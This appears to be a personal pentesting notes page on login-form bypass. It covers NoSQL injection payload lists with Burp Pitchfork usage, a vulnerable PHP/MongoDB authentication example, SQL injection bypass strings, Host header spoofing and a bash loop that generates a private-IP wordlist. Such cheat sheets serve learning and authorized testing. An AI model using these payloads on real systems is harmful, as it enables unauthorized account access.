---
title: Login From
date: 2026-08-15
ShowToc: true
draft: false
TocOpen: true
password:
isPrivate: true
tags:
  - blog
lastmod: 2026-08-25T08:47:28.544Z
---
### Content-Type Fuzzing

```
application/json
application/x-www-form-urlencoded
application/form-data
```

www.convertsimple.com/convert-query-string-to-json/

![Pasted image 20260825163842.png](/ob/Pasted%20image%2020260825163842.png)

### NOSQL

* Example : MongoDB DynamoDB Firebase Firestore
* payload list

> Use the burp 's function to handle the username and password

```
[$regex]=.*
[$ne]=test
[$ne]=test
[$ne]=x
[$gt]=
[$gte]=
{"$ne": null}
{"$ne": "bar"}
{"$gt": undefined}
```

```
user=admin&password[$ne]=wrongpassword
user=root&password[$ne]=wrongpassword
username[$regex]=.*&password[$regex]=.*
username[$ne]=test@test.com&password[$ne]=test
username[$ne]=test&password[$ne]=test
username=admin%40mangomail.com&password[$ne]=x
username[$gt]=&password[$gt]=
username[$gte]=&password[$gte]=
```

JSON format

```
{"$ne": "cascs"}
{"$ne": "bar"}
{"username": {"$ne": null}, "password": '$ne': null}}
{"username": {"$ne": "foo"}, "password": {"$ne": "bar"}}
{"username": {"$gt": undefined}, "password": {"$gt": undefined}}
{"username": {"$gt":""}, "password": {"$gt":""}}
{"username":{"$in":["Admin", "4dm1n", "admin", "root", "administrator"]},"password":{"$gt":""}}
true, $where: '1 == 1'
, $where: '1 == 1'
$where: '1 == 1'
', $where: '1 == 1
1, $where: '1 == 1'
|| 1==1
|| 1==1//
|| 1==1%00
```

I will choose the `Pitchfork attack` , and i will also choose the =

payload 1

```
=admin
=root
=[$regex]=.*
=[$ne]=admin@test.com
=[$ne]=admin
=admin%40mangomail.com
[$gt]=
[$gte]=
```

![Pasted image 20260825152834.png](/ob/Pasted%20image%2020260825152834.png)

On the `server-side`, the authentication function these parameters are being passed to looks like this by PHP:

```
...
if ($_SERVER['REQUEST_METHOD'] === "POST"):
    if (!isset($_POST['email'])) die("Missing `email` parameter");
    if (!isset($_POST['password'])) die("Missing `password` parameter");
    if (empty($_POST['email'])) die("`email` can not be empty");
    if (empty($_POST['password'])) die("`password` can not be empty");

    $manager = new MongoDB\Driver\Manager("mongodb://127.0.0.1:27017");
    $query = new MongoDB\Driver\Query(array("email" => $_POST['email'], "password" => $_POST['password']));
    $cursor = $manager->executeQuery('mangomail.users', $query);
        
    if (count($cursor->toArray()) > 0) {
        ...
```

```
db.users.find({
    email: "<email>",
    password: "<password>"
});
```

The problem is that both email and password are user-controlled inputs, which are passed unsanitized into a MongoDB query. This means we (as attackers) can take control of the query.

```
db.users.find({
    email: {$ne: "test@test.com"},
    password: {$ne: "test"}
});
```

![Pasted image 20260818113638.png|336](Pasted%20image%2020260818113638.png%7C336)

### SQL

```
administrator'--
1 ' or 1=1 --
' OR '1'='1
admin' --
' OR 1=1 LIMIT 1 --
```

### BurteForce

* TO DO

### Host Header

wordlist

```
localhost
127.0.0.1
for a in {1..255};do
    for b in {1..255};do
        echo "192.168.$a.$b" >> ips.txt
    done
done
empty value
```

When we set the host header to `localhost`, indicating that the website was accessed locally, we can bypass the authentication check and access the admin area:

![Pasted image 20260818133816.png](/ob/Pasted%20image%2020260818133816.png)

If the web application accepts only specific IP addresses of an internal network, manual testing is impossible due to the large number of private IP addresses. However, we can fuzz the host header to check if we can bypass the authentication check. For instance, if we want to create a wordlist of the `192.168.0.0-192.168.255.255` private IP address range, we could use a bash script similar to the following:

```
for a in {1..255};do
    for b in {1..255};do
        echo "192.168.$a.$b" >> ips.txt
    done
done
```
